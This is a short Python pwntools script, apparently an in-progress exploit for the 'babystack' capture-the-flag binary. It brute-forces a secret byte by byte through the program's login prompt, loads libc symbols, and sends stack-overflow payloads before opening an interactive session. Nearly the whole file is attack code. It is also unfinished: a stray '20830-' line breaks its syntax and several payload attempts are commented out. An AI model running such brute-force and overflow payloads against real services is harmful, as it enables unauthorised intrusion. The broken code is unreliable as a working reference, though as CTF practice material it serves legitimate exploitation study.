from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

def checkCanary(p):
    canary = b''
    for i in range(0, 16):
        for x in range(1, 256):
            p.recvuntil('>> ')
            p.sendline('1')
            p.recvuntil('passowrd :')
            payload = canary+p8(x)
            #print(payload)
            p.sendline(payload)
            line = p.recvline()
            #print(line, x)
            if b'Login Success' in line:
                canary += p8(x)
                p.recvuntil('>> ')
                p.sendline('1')
                break
    print(canary)
    return canary

p = process('./babystack')
elf = ELF('./babystack')
libc = ELF('./libc.so.6')
print(hex(libc.symbols['_IO_file_setbuf']))
#7fcc73678430 -0x78430
#7fcc73600000
20830-
# rop = ROP(elf)
# rop.call(elf.plt['puts'], [elf.got['puts']])
# print(rop.dump())

canary = checkCanary(p)
p.recvuntil('>> ')
p.sendline('1')
p.recvuntil('passowrd :')
gdb.attach(p)
#p.send(p64(0)*2+b'A'*48+canary + b'A'*(16+31))
#p.send(p64(0)*2+b'A'*48+canary + b'C'*8*2 + b'D'*7 + p8(0))
p.send(p8(0)+b'B'*(63+8))
p.recvuntil('>> ')
p.send(b'3'+b'C'*15)
p.sendline(b'B'*63)

# p.recvuntil('>> ')
# p.sendline('1')
# p.recvuntil('>> ')
# p.sendline('3')
# p.recvuntil('>> ')
# p.sendline('2')
# p.recvuntil('>> ')


p.interactive() 